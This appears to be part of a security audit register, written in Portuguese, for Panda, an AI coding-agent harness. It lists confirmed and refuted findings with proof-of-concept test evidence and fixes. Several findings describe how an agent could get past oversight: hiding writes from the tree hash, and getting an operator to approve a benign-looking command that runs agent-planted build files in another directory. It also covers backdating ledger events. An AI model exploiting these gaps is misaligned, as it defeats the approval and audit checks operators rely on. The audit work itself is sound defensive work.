+    locations: ["src/panda_core/treehash.py:22@704f387", "src/panda_core/treehash.py:48@704f387", "src/panda_core/treehash.py:60-67@704f387"]
+    claim: "_SKIP_DIRS poda diretórios que o agente pode escrever, e o cache do Agent reutiliza o digest quando (mtime_ns, size) coincidem."
+    evidence:
+      - {leg: A, method: static, detail: "treehash.py:22 _SKIP_DIRS; :48 poda; :62 'if hit and hit[0]==st_mtime_ns and hit[1]==st_size: digest=hit[2]'; agent.py:231 _tree_cache vive a sessão inteira."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_session.py -k tree_hash", output_excerpt: "assert 'd8750cb8...' != 'd8750cb8...'  (mtime restaurado)\nassert '59e436d1...' != '59e436d1...'  (corpus/node_modules)\n2 failed"}
+    falsification: "O docstring declara o escopo 'every regular file under corpus/'; os diretórios podados são regulares e estão sob corpus/. O cache por mtime é otimização consciente, mas não está documentado no CONTRACT."
+    impact: "C-6 ('turn.end carries a corpus tree hash') não reflete código executável colocado pelo agente (R2-210) nem alterações com mtime preservado."
+    fix: {approach: "Não podar dentro de corpus/ (ou registrar a lista podada no evento) e invalidar cache por ctime/inode", sketch: "chave (st_mtime_ns, st_ctime_ns, st_size, st_ino); _SKIP_DIRS só fora de corpus ou com tree_skipped no evento", risk: "custo de hash maior", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w2b.py::test_tree_hash_covers_agent_writable_node_modules_under_corpus", "tests/security/test_w2b.py::test_tree_hash_sees_content_change_with_restored_mtime"]
+    related: ["LED-001", "R2-210"]
+  - id: "R2-227"
+    kind: new
+    title: "`session recover` adota qualquer evento único (tipo e ts arbitrários, ex.: approval.decision datado de 2020) e verify fica ok"
+    severity: P4
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B20-recover-unchecked"
+    class: ["ledger-integrity", "hardening"]
+    boundary: "B7"
+    preconditions: "Quem escreve o arquivo do ledger (sem tocar no anchor) e convence o operador a rodar recover (a dica de _check_anchor sugere isso)."
+    locations: ["src/panda_core/session.py:391-443@704f387", "src/panda_core/session.py:333-337@704f387"]
+    claim: "recover só exige cadeia íntegra e anchor = penúltimo; não confere monotonicidade de ts, tipo do evento nem janela de tempo do anchor.updated_at."
+    evidence:
+      - {leg: A, method: static, detail: "session.py:414-443 sem checagem de ts/type."}
+      - {leg: B, method: executed, command: "python poc/B/scripts/rec.py", output_excerpt: "recover: True\nverify ok: True events: 4\n[('approval.decision', None), ('session.recovered', 'approval.decision')]"}
+    falsification: "Recuperação é visível (session.recovered) e o limite conhecido já admite que quem escreve ledger+anchor reconstrói tudo; ganho marginal pequeno, por isso P4."
+    fix: {approach: "Aceitar só eventos plausíveis de crash", sketch: "exigir adopted.ts >= events[-2].ts e adopted.ts <= anchor.updated_at + 60 s; recusar tipos approval.* e session.*; mostrar o evento adotado e pedir confirmação no CLI", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w2a.py::test_recover_refuses_backdated_or_approval_events"]
+    related: ["SES-002", "SES-003"]
+  # ===================== componente: service.py + mcp_server.py (stdio/HTTP) =====================
+  - id: "R2-228"
+    kind: new
+    title: "Ferramentas MCP síncronas rodam dentro do event loop do FastMCP: um `validate` (até 180 s, código do corpus) congela todos os clientes HTTP"
+    severity: P4
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B13-sync-in-loop"
+    class: ["dos", "mcp"]
+    boundary: "B4"
+    preconditions: "Transporte streamable-http com mais de um cliente; validador lento (ou hostil até o timeout)."
+    locations: ["src/panda_core/mcp_server.py:336-344@704f387", "src/panda_core/service.py:35-43@704f387", "src/panda_core/config.py:182@704f387"]
+    claim: "FastMCP 1.30 chama funções síncronas diretamente (func_metadata.py: 'return fn(**args)'), e _run bloqueia esperando o thread; nenhuma outra requisição é atendida enquanto o validador roda."
+    evidence:
+      - {leg: A, method: static, detail: "Tools definidos com def (mcp_server.py:330-376); service._run usa pool.submit(...).result() (service.py:42-43), bloqueando o loop; mcp/server/fastmcp/utilities/func_metadata.py:112-115."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_mcp_http.py::test_long_validate_does_not_freeze_other_mcp_clients (2 execuções)", output_excerpt: "AssertionError: outro cliente esperou 2.6s pelo validate (x2)\n1 failed, 1 passed"}
+    falsification: "Medida temporal repetida 2x com o mesmo resultado (validador fixture dorme 3 s via PANDA_FAKE_SLEEP)."
+    fix: {approach: "Declarar as tools como async e usar anyio.to_thread.run_sync", sketch: "async def validate(...): return await anyio.to_thread.run_sync(service.validate, release)", risk: "baixo (serializar acesso ao ledger com o lock existente)", rollback: "trivial"}
+    tests_to_add: ["tests/test_service_mcp.py::test_long_validate_does_not_freeze_other_mcp_clients"]
+    related: ["MCP-002", "SEC-006"]
+  - id: "REF-206"
+    kind: refuted
+    title: "Hipótese: MCP HTTP aceita DNS rebinding (Host estranho), Origin de navegador ou POST text/plain"
+    status: refuted
+    evidence_level: E3
+    locations: ["src/panda_core/mcp_server.py:295-311@704f387", "src/panda_core/mcp_server.py:328@704f387"]
+    claim: "Com host 127.0.0.1/localhost/::1 o FastMCP 1.30 liga enable_dns_rebinding_protection com allowed_hosts loopback e allowed_origins vazio; Host evil -> 421, Origin evil -> 403, text/plain -> 400/415."
+    evidence:
+      - {leg: A, method: static, detail: "mcp/server/fastmcp/server.py:191-194 + transport_security.py:109-132."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_mcp_http.py::test_mcp_http_rejects_rebound_host_and_foreign_origin", output_excerpt: "1 passed (servidor real em 127.0.0.1:<porta livre>)"}
+    falsification: "A proteção vem da dependência, não do Panda: se o piso de versão do mcp cair ou alguém passar transport_security=None, some. Sugestão: teste de regressão no repo (este PoC) e passar TransportSecuritySettings explicitamente. Processos locais continuam sem autenticação (limite conhecido)."
+    tests_to_add: ["tests/test_service_mcp.py::test_mcp_http_rejects_rebound_host_and_foreign_origin"]
+  - id: "REF-207"
+    kind: refuted
+    title: "Hipótese: MCP validate/study_show escapam da política ou do ledger (paridade com o CLI)"
+    status: refuted
+    evidence_level: E2
+    locations: ["src/panda_core/service.py:115-143@704f387", "src/panda_core/service.py:173-195@704f387"]
+    claim: "validate e study_show passam por ToolRegistry + PolicyEngine (approve=None => ask negado); validate grava tool.call antes de rodar; falha do ledger levanta SessionIntegrityError."
+    evidence:
+      - {leg: A, method: static, detail: "service.py:123-132, :174-175."}
+      - {leg: B, method: independent, detail: "O teste HTTP acima chamou tools/call validate pelo servidor real e o fluxo passou pelo registry (validador rodou)."}
+    falsification: "study_show executa antes de registrar (service.py:239-241) — leitura apenas; e o append após session.end está em R2-225."
+  # ===================== componente: cockpit ApprovalScreen + flags de turno =====================
+  - id: "R2-229"
+    kind: new
+    title: "Pedido de aprovação de run_shell não mostra o `cwd` escolhido pelo modelo: o operador aprova `make test` que roda em corpus/evil"
+    severity: P2
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B21-approval-request-incomplete"
+    class: ["approval-ui", "owasp:LLM06"]
+    boundary: "B6"
+    preconditions: "Comando `ask` cujo efeito depende do diretório (make, npm test, pytest, python script.py, git em repo aninhado); operador aprova pelo texto."
+    locations: ["src/panda_core/tools.py:829-843@704f387", "src/panda_core/tools.py:101-122@704f387", "src/panda_cli/cockpit.py:221-237@704f387"]
+    claim: "ApprovalRequest não tem campo de cwd e run_shell usa resource=preview=' '.join(argv); o modal e o REPL exibem só o comando."
+    evidence:
+      - {leg: A, method: static, detail: "tools.py:830-831 resolve cwd; tools.py:836-843 _authorize(resource=command_text, preview=command_text) sem cwd; ApprovalRequest (tools.py:102-110) sem o campo."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_cockpit_gate.py::test_run_shell_approval_shows_the_working_directory", output_excerpt: "AssertionError: {'tool': 'run_shell', 'action': 'shell', 'resource': 'make test', 'rule_id': 'shell-default-ask', ...}\nassert 'corpus/evil' in 'make test make test '\n1 failed"}
+    falsification: "O tool.call no ledger guarda o cwd (argumentos), então a proveniência existe; o defeito é o que o operador vê antes de aprovar (C-4)."
+    impact: "Aprovação de um comando aparentemente benigno executa Makefile/package.json/conftest.py plantados pelo agente em outro diretório."
+    fix: {approach: "Incluir cwd e argv exato no pedido", sketch: "resource=f'{shlex.join(argv)}  (cwd: {cwd_relative})'; preview com uma linha 'cwd:' e um argv por linha", risk: "nenhum", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w4.py::test_run_shell_approval_shows_the_working_directory"]
+    related: ["APR-002", "R2-203", "R2-201"]
+  - id: "REF-208"
+    kind: refuted
+    title: "Hipóteses: linha longa sem espaços escapa do medidor de linhas ocultas; Allow por clique pula a trava; comandos mudam a conversa durante o turno"
+    status: refuted
+    evidence_level: E3
+    locations: ["src/panda_cli/cockpit.py:262-307@704f387", "src/panda_cli/cockpit.py:930-940@704f387", "src/panda_core/agent.py:391-396@704f387"]
+    claim: "O preview quebra linhas longas (o final aparece ou conta como oculto); on_button_pressed chama action_allow com as mesmas travas (armado, oculto, dupla confirmação); /model, /study, !cmd são recusados com turno ativo (IDLE_FREE_COMMANDS só /help,/quit,/exit; _require_idle no Agent)."
+    evidence:
+      - {leg: A, method: static, detail: "cockpit.py:292-307 action_allow; cockpit.py:930-940 _submit_input; agent.py:_require_idle."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_cockpit_gate.py::test_approval_preview_shows_the_tail_of_a_long_unbroken_line", output_excerpt: "1 passed (TAIL_EVIL_PAYLOAD visível no preview 80x30)"}
+    falsification: "O valor de risk vem da regra e pode ser rebaixado pela workspace (R2-207), anulando a dupla confirmação; o cwd não aparece (R2-229)."
+  # ===================== componente: provider.py (_sse_data, terminais, ids, reparo) =====================
+  - id: "R2-230"
+    kind: variant
+    title: "`data: [DONE]` conta como evento terminal também em Anthropic, Responses e Google: stream cortado + [DONE] vira resposta completa"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B22-terminal-criteria"
+    class: ["stream-integrity", "robustness"]
+    boundary: "B5"
+    preconditions: "Gateway (OpenCode Go é um proxy) que anexa [DONE] ao encerrar uma resposta upstream interrompida."
+    locations: ["src/panda_core/provider.py:1488-1490@704f387", "src/panda_core/provider.py:1654-1656@704f387", "src/panda_core/provider.py:1846-1848@704f387"]
+    claim: "Nos três protocolos não-OpenAI o ramo `if data == '[DONE]': terminal = True` aceita o fim sem message_stop/message_delta, response.completed ou finishReason; o texto parcial vira turno 'completed' com finish 'stop'."
+    evidence:
+      - {leg: A, method: static, detail: "provider.py:1488, :1654, :1846 marcam terminal com [DONE]; finish_reason vira 'stop' por omissão (provider.py:1606-1607, :1797-1798, :1977-1978)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_provider.py -k done_marker", output_excerpt: "FAILED [claude-sonnet-5] DID NOT RAISE PandaError\nFAILED [gemini-4-pro] DID NOT RAISE PandaError\nFAILED [gpt-5.5] DID NOT RAISE PandaError\n3 failed"}
+    falsification: "Nenhum dos três protocolos nativos emite [DONE]; se o gateway nunca o fizer, o ramo é morto (então removê-lo é sem risco). PROV-002 afirma que corte antes do terminal é erro nos quatro protocolos."
+    fix: {approach: "[DONE] só é terminal para openai-chat", sketch: "nos outros três: if data == '[DONE]': break (sem terminal=True)", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w2b.py::test_done_marker_is_not_a_terminal_event_for_non_openai_protocols"]
+    related: ["PROV-002"]
+  - id: "R2-231"
+    kind: variant
+    title: "Reparo de histórico incompleto: Google não responde functionCall pendente (e OpenAI chat não sintetiza tool); ids repetidos pelo provedor ('call_0' a cada passo) seguem duplicados para Anthropic/Responses"
+    severity: P4
+    confidence: medium
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B23-history-repair-partial"
+    class: ["robustness", "provider-adapter"]
+    boundary: "B5"
+    preconditions: "Histórico com chamada sem resultado (troca de modelo após falha/corte) ou backend que reusa ids de tool call."
+    locations: ["src/panda_core/provider.py:731-820@704f387", "src/panda_core/provider.py:822-865@704f387", "src/panda_core/provider.py:268-306@704f387", "src/panda_core/provider.py:1250-1254@704f387"]
+    claim: "convert_messages_for_google descarta respostas órfãs mas não sintetiza functionResponse para chamadas sem resposta; sanitize_messages_for_openai não repara nada; PROV-004 só torna únicos os ids gerados, não os fornecidos."
+    evidence:
+      - {leg: A, method: static, detail: "Só _normalize_anthropic_turns.close_dangling (provider.py:392-433) e _pair_responses_items (provider.py:643-660) sintetizam resultados; _google_valid_start só filtra. _generated_id (provider.py:1250) não é aplicado a ids do provedor."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_provider.py -k 'history'", output_excerpt: "AssertionError: ['call_0', 'call_0']  (anthropic tool_use ids)\nAssertionError: ['call_0', 'call_0']  (responses function_call)\nAssertionError: ([...grep..., ...read_file...], [{'functionResponse': {'name': 'grep',...}}, {'text': 'continue'}]) assert 1 == 2\n3 failed"}
+    falsification: "O Agent fecha chamadas pendentes nos caminhos de erro (_close_dangling_tool_calls), então o caso Google exige um histórico que escapou disso; a rejeição dos ids duplicados pelas APIs é [memory: unverified]. Por isso P4/medium."
+    fix: {approach: "Reparar no Agent, de forma agnóstica de protocolo, antes de cada stream", sketch: "normalizar histórico: id duplicado -> f'{id}_{n}' consistente em call e tool; toda tool_call sem tool -> tool sintético NO_TOOL_RESULT; aplicar para os 4 protocolos", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/test_provider.py::test_google_history_answers_a_dangling_function_call", "tests/test_provider.py::test_anthropic_history_has_unique_tool_use_ids_when_provider_repeats_ids"]
+    related: ["ADP-001", "ADP-002", "PROV-004"]
+  - id: "REF-209"
+    kind: refuted
+    title: "Hipóteses: _sse_data perde eventos com várias linhas data/comentários/CRLF; ids gerados colidem entre passos; finish incompleto executa tool calls"
+    status: refuted
+    evidence_level: E2
+    locations: ["src/panda_core/provider.py:978-997@704f387", "src/panda_core/provider.py:1250-1254@704f387", "src/panda_core/agent.py:454-458@704f387"]
+    claim: "_sse_data junta data: por evento e ignora comentários; aiter_lines normaliza CRLF; _stream_serial por instância gera call_<n>_<i> distinto a cada stream (inclusive retentativas); 'length'/'incomplete' descarta as chamadas."
+    evidence:
+      - {leg: A, method: static, detail: "provider.py:985-997; :1258 incrementa serial; agent.py INCOMPLETE_REASONS."}
+      - {leg: B, method: independent, detail: "Os testes de poc/B/test_b_provider.py usam _sse_data real via MockTransport (eventos parseados corretamente até o [DONE])."}
+    falsification: "Restam R2-230 e R2-231."
+  # ===================== componente: .github/workflows + tests/test_workflows.py =====================
+  - id: "R2-232"
+    kind: new
+    title: "tests/test_workflows.py só procura a string `contents: write`: write-all por job, id-token: write, pull_request_target e continue-on-error nos testes passam despercebidos"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B24-text-matching-spec"
+    class: ["supply-chain", "test-quality", "vacuous-test"]
+    boundary: "B8"
+    preconditions: "Mudança futura no release.yml (PR, Dependabot, edição apressada)."
+    locations: ["tests/test_workflows.py:30-45@704f387", "tests/test_workflows.py:48-52@704f387", ".github/workflows/release.yml:1-11@704f387"]
+    claim: "4/4 mutações perigosas do release.yml deixam toda a suíte test_workflows verde, então C-12 está protegido só contra a regressão exata do round 1."
+    evidence:
+      - {leg: A, method: static, detail: "test_only_the_publish_job_can_write filtra por 'contents: write' (test_workflows.py:36); test_the_release_tests_run_the_same_checks_as_ci só verifica presença de 'pytest' (:48-52); não há verificação de gatilhos (on:)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_workflows.py (copia .github para tmp, aplica a mutação, roda todas as test_* do arquivo original)", output_excerpt: "FAILED [id-token write in the build job] mutação não detectada\nFAILED [job-level write-all in the test job]\nFAILED [pull_request_target trigger]\nFAILED [tests skipped with continue-on-error]\n4 failed"}
+    falsification: "Conferi que cada mutação de fato altera o arquivo (4x True). O teste é de texto por decisão (sem dependência de YAML); a falha é de cobertura, não de sintaxe."
+    impact: "Um release com permissões de escrita amplas ou sem gate de testes passa no CI do próprio projeto."
+    fix: {approach: "Parsear YAML (pyyaml já vem com dev? senão ruamel) e afirmar invariantes semânticas", sketch: "para cada job: permissions ⊆ {contents: read} exceto publish ⊆ {contents: write}; 'on' ⊆ {push.tags, workflow_dispatch}; nenhum step com continue-on-error; nenhum 'write-all'; ações de terceiros com SHA", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/test_workflows.py::test_workflow_spec_catches_dangerous_release_mutations"]
+    related: ["SUP-001"]
+  - id: "R2-233"
+    kind: new
+    title: "Release não roda Windows nem pip-audit antes de publicar; checkout persiste o GITHUB_TOKEN; ação de terceiro (softprops) com contents: write por tag"
+    severity: P4
+    confidence: high
+    status: confirmed
+    evidence_level: E2
+    root_cause: "RC-B25-release-gate-scope"
+    class: ["supply-chain", "doc-claim-partial"]
+    boundary: "B8"
+    preconditions: "Tag v* empurrada."
+    locations: [".github/workflows/release.yml:13-41@704f387", ".github/workflows/release.yml:49-52@704f387", ".github/workflows/release.yml:78-84@704f387", ".github/workflows/ci.yml:16-23@704f387", ".github/workflows/ci.yml:68-84@704f387"]
+    claim: "O job test do release usa só ubuntu/3.12 (o CI tem matriz com windows-latest e 3.13); o audit só existe no ci.yml e não é dependência do release; actions/checkout sem persist-credentials: false; softprops/action-gh-release@v2 (terceiro, por tag) recebe contents: write."
+    evidence:
+      - {leg: A, method: static, detail: "release.yml:15 runs-on: ubuntu-latest, :20 python 3.12; nenhum job audit em release.yml; release.yml:16,49 checkout sem persist-credentials; :80 softprops@v2."}
+      - {leg: B, method: independent, detail: "Comparação com ci.yml:16-23 (matriz) e ci.yml:68-84 (audit); tests/test_workflows.py:55-56 só exige pip-audit no ci.yml."}
+    falsification: "Tag pinning é limite conhecido; o novo aqui é a assimetria release x CI (Windows e audit fora do gate) e a credencial persistida."
+    fix: {approach: "Reusar o CI como gate do release", sketch: "release: jobs.test usa a mesma matriz (ou workflow_call do ci.yml) + audit; needs: [test, audit]; checkout com persist-credentials: false; pinar softprops por SHA ou usar `gh release create` com GITHUB_TOKEN", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/test_workflows.py::test_release_gate_runs_the_ci_matrix_and_audit"]
+    related: ["SUP-001", "WIN-001"]
+  # ===================== afirmações C-x transversais =====================
+  - id: "DRIFT-200"
+    kind: drift
+    title: "SECURITY.md 'Panda never prints .env contents, tokens, or API keys' e C-7 'redigido antes do texto enviado ao provedor' não valem"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B14-redaction-at-persistence-only"
+    class: ["doc-claim-false", "owasp:LLM02"]
+    boundary: "B5"
+    preconditions: "Ver R2-200, R2-217, R2-218."
+    locations: ["SECURITY.md:70@704f387", "docs/CONTRACT.md:123-124@704f387", "src/panda_core/agent.py:541-547@704f387"]
+    claim: "Conteúdo de .env versionado (git log -p) e credenciais em arquivos/saídas aparecem no cockpit e vão ao provedor sem redação; só instruções e ledger são redigidos."
+    evidence:
+      - {leg: A, method: static, detail: "SECURITY.md:70; agent.py:541-547 sem redact."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_shell_policy.py::test_git_log_patch_does_not_print_committed_secret_file poc/B/test_b_redact.py::test_tool_results_are_redacted_before_they_reach_the_provider", output_excerpt: "2 failed (SYNTH_SECRET no conteúdo da ferramenta e na chamada ao provedor)"}
+    falsification: "O CONTRACT promete só redação de instruções e de persistência; a divergência é com SECURITY.md e com a afirmação C-7 do projeto."
+    fix: {approach: "Corrigir o texto ou implementar R2-218", sketch: "SECURITY.md: 'Tool output is sent to the provider unredacted; reads of credential paths are denied'", risk: "nenhum", rollback: "trivial"}
+    tests_to_add: []
+    related: ["R2-200", "R2-218", "C-7"]
+  - id: "REF-210"
+    kind: refuted
+    title: "Hipótese (C-6): write_file/edit_file sobrescrevem um arquivo alterado durante a espera da aprovação"
+    status: refuted
+    evidence_level: E3
+    locations: ["src/panda_core/tools.py:719-724@704f387", "src/panda_core/tools.py:795-800@704f387"]
+    claim: "write_file compara o SHA-256 antes/depois da aprovação e edit_file compara os bytes; o arquivo alterado pelo approver é preservado e a ferramenta falha."
+    evidence:
+      - {leg: A, method: static, detail: "tools.py:719 'if current != hash_before'; tools.py:796 'path.read_bytes() != raw'."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_cockpit_gate.py::test_write_file_is_not_applied_when_the_file_changes_during_approval", output_excerpt: "1 passed"}
+    falsification: "Resta uma janela de microssegundos entre a comparação e o atomic_write (sem lock); e o diretório pai pode virar link (classe R2-209)."
+  - id: "REF-211"
+    kind: refuted
+    title: "Hipótese (C-11): --private grava o texto da tarefa ou a prosa do assistente"
+    status: refuted
+    evidence_level: E2
+    locations: ["src/panda_core/agent.py:426-433@704f387", "src/panda_core/agent.py:478-495@704f387", "src/panda_cli/main.py:471-476@704f387"]
+    claim: "message.user e message.assistant guardam só sha256+tamanho; run.start guarda task=None e o rótulo vira '[private task]'."
+    evidence:
+      - {leg: A, method: static, detail: "agent.py:426-433 e :478-495; main.py:471-476."}
+      - {leg: B, method: independent, detail: "Os testes de PRIV-001 da suíte (tests/security/test_w5.py) cobrem o caminho; não encontrei outro evento com o texto além dos documentados (tool.call, approval.request.preview)."}
+    falsification: "task_sha256 de tarefas curtas é adivinhável por dicionário; approval.request.preview e tool.call podem citar a tarefa (documentado)."
